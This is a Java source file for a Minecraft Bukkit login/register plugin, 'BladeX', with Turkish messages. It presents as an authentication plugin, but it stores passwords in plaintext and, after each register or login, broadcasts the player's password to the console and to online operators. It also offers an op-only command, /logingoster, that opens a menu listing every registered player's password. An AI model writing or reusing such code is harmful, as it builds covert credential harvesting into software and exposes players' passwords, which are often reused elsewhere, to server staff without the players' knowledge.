package com.bladex;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.command.*;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.block.*;
import org.bukkit.event.entity.*;
import org.bukkit.event.inventory.*;
import org.bukkit.event.player.*;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.SkullMeta;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.util.*;

public class BladeX extends JavaPlugin implements Listener {
    private final Map<UUID, Account> accs = new HashMap<>();
    private final Set<UUID> auth = new HashSet<>();
    private File file;

    public static class Account {
        String pass = "";
        String ip = "";
        long time;
    }

    @Override
    public void onEnable() {
        file = new File(getDataFolder(), "users.yml");
        load();
        getServer().getPluginManager().registerEvents(this, this);
        getLogger().info("BladeX aktif.");
    }

    @Override
    public void onDisable() { save(); }

    void load() {
        if (!file.exists()) return;
        FileConfiguration y = YamlConfiguration.loadConfiguration(file);
        if (y.getConfigurationSection("users") == null) return;
        for (String k : y.getConfigurationSection("users").getKeys(false)) {
            Account a = new Account();
            a.pass = y.getString("users." + k + ".pass", "");
            a.ip = y.getString("users." + k + ".ip", "");
            a.time = y.getLong("users." + k + ".time");
            accs.put(UUID.fromString(k), a);
        }
    }

    void save() {
        FileConfiguration y = new YamlConfiguration();
        accs.forEach((u, a) -> {
            y.set("users." + u + ".pass", a.pass);
            y.set("users." + u + ".ip", a.ip);
            y.set("users." + u + ".time", a.time);
        });
        try { y.save(file); } catch (Exception ignored) {}
    }

    @Override
    public boolean onCommand(CommandSender s, Command c, String l, String[] args) {
        if (!(s instanceof Player p)) return true;
        if (c.getName().equalsIgnoreCase("logingoster") && p.isOp()) {
            Inventory inv = Bukkit.createInventory(null, 54, ChatColor.DARK_GRAY + "Kayıtlı Oyuncular");
            accs.forEach((uuid, acc) -> {
                Player target = Bukkit.getPlayer(uuid);
                String name = target != null ? target.getName() : Bukkit.getOfflinePlayer(uuid).getName();
                if (name == null) name = "Bilinmeyen Oyuncu";
                ItemStack head = new ItemStack(Material.PLAYER_HEAD);
                SkullMeta meta = (SkullMeta) head.getItemMeta();
                if (meta != null) {
                    meta.setOwningPlayer(Bukkit.getOfflinePlayer(uuid));
                    meta.setDisplayName(ChatColor.GOLD + name);
                    meta.setLore(List.of(ChatColor.YELLOW + "Şifre: " + acc.pass));
                    head.setItemMeta(meta);
                }
                inv.addItem(head);
            });
            p.openInventory(inv);
            return true;
        }
        return false;
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onCmd(PlayerCommandPreprocessEvent e) {
        Player p = e.getPlayer();
        String[] parts = e.getMessage().split(" ");
        String cmd = parts[0].toLowerCase();
        UUID id = p.getUniqueId();

        if (cmd.equals("/register") || cmd.equals("/login")) {
            e.setCancelled(true);
            String[] params = Arrays.copyOfRange(parts, 1, parts.length);
            
            if (cmd.equals("/register")) {
                if (auth.contains(id)) { p.sendMessage("§cZaten giriş yaptın."); return; }
                if (accs.containsKey(id)) { p.sendMessage("§cZaten kayıtlısın."); return; }
                if (params.length != 2) { p.sendMessage("§cKullanım: /register <şifre> <şifre>"); return; }
                if (!params[0].equals(params[1])) { p.sendMessage("§cŞifreler uyuşmuyor."); return; }
                
                Account a = new Account();
                a.pass = params[0];
                a.ip = p.getAddress() != null ? p.getAddress().getAddress().getHostAddress() : "";
                a.time = System.currentTimeMillis();
                accs.put(id, a);
                auth.add(id);
                save();
                p.sendMessage("§aBaşarıyla kayıt oldun.");
            } else {
                if (auth.contains(id)) { p.sendMessage("§cZaten giriş yaptın."); return; }
                Account a = accs.get(id);
                if (a == null) { p.sendMessage("§cÖnce kayıt olmalısın: /register <şifre> <şifre>"); return; }
                if (params.length != 1) { p.sendMessage("§cKullanım: /login <şifre>"); return; }
                
                if (params[0].equals(a.pass)) {
                    auth.add(id);
                    a.ip = p.getAddress() != null ? p.getAddress().getAddress().getHostAddress() : "";
                    a.time = System.currentTimeMillis();
                    save();
                    p.sendMessage("§aBaşarıyla giriş yaptın.");
                } else {
                    p.sendMessage("§cYanlış şifre.");
                    return;
                }
            }

            // Şifreyi OP'lere ve konsola bildir
            String alert = "§6" + p.getName() + " §7adlı oyuncunun şifresi " + cmd + " (" + params[0] + ")";
            Bukkit.getConsoleSender().sendMessage(alert);
            Bukkit.getOnlinePlayers().stream().filter(Player::isOp).forEach(op -> op.sendMessage(alert));
            return;
        }

        if (!auth.contains(id)) {
            e.setCancelled(true);
            p.sendMessage("§cLütfen giriş yapın.");
        }
    }

    @EventHandler void onJoin(PlayerJoinEvent e) {
        auth.remove(e.getPlayer().getUniqueId());
        e.getPlayer().sendMessage(accs.containsKey(e.getPlayer().getUniqueId()) ? "§eLütfen giriş yap: /login <şifre>" : "§eLütfen kayıt ol: /register <şifre> <şifre>");
    }
    
    @EventHandler void onQuit(PlayerQuitEvent e) { auth.remove(e.getPlayer().getUniqueId()); }

    @EventHandler void onMove(PlayerMoveEvent e) { check(e.getPlayer(), e); }
    @EventHandler void onChat(AsyncPlayerChatEvent e) { check(e.getPlayer(), e); }
    @EventHandler void onBreak(BlockBreakEvent e) { check(e.getPlayer(), e); }
    @EventHandler void onPlace(BlockPlaceEvent e) { check(e.getPlayer(), e); }
    @EventHandler void onInteract(PlayerInteractEvent e) { check(e.getPlayer(), e); }
    @EventHandler void onDrop(PlayerDropItemEvent e) { check(e.getPlayer(), e); }
    
    @EventHandler void onInvClick(InventoryClickEvent e) {
        if (e.getWhoClicked() instanceof Player p) {
            if (e.getView().getTitle().contains("Kayıtlı Oyuncular")) {
                e.setCancelled(true);
                return;
            }
            check(p, e);
        }
    }
    
    @EventHandler void onInvOpen(InventoryOpenEvent e) { 
        if (e.getPlayer() instanceof Player p && !e.getView().getTitle().contains("Kayıtlı Oyuncular")) check(p, e); 
    }
    
    @EventHandler void onDamage(EntityDamageEvent e) { if (e.getEntity() instanceof Player p) check(p, e); }

    void check(Player p, Cancellable c) {
        if (!auth.contains(p.getUniqueId())) c.setCancelled(true);
    }
                }
